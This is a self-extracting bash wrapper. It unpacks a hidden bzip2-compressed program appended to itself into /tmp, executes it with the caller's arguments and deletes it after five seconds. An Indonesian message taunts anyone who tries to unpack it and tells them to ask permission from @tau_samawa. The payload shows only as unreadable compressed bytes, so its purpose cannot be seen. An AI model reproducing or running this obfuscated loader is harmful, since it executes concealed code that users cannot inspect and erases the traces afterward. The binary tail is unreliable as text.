#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY�砖  V�A�@ ���������   @t��ل��M4���2h���@4`M �Dɑ2�MM@  �zOP  8ɓF!���`��i�D��@�l�=M4�SF@d4z��/�E=VF7��+S:��]q�ZH�*����nB#�!�.�B3(G0�&b�� �a��ơ����"�)�2�^G��f�5�/ε�U�k�f��wYe,(�рᑒ��ib��t�:�Zʱ�nf���I���Q�Jϵ
D��SJ�7xa;�mNV� }ᠨ�t'�
4�Q��*��ՠ�hV&��l����+�Jˊ"����}^|�r�3�.p5?��?\֔�u����q}n�f��-�E�5/�'}&��-{��m��tM�y�]V�B5�}q�y�Lʌ�^���b�Ȭ��)Ľ�l;G��+��A�ʹ�+��NFL-h�n�|T�%LBi#�$��[�L�c98�C��5����6L	9z�2�h�hq�5���r�����
	���!w�����Y	Y�/���Gت��+	��b�jx[EU���Q"]�N+��Y6��0�IxfӒ	�1��
V�{�l]٥\����Ľ���k"QSf22��l���6���E`Ƹ���
v�(�Wg ʏ��?�����H�
��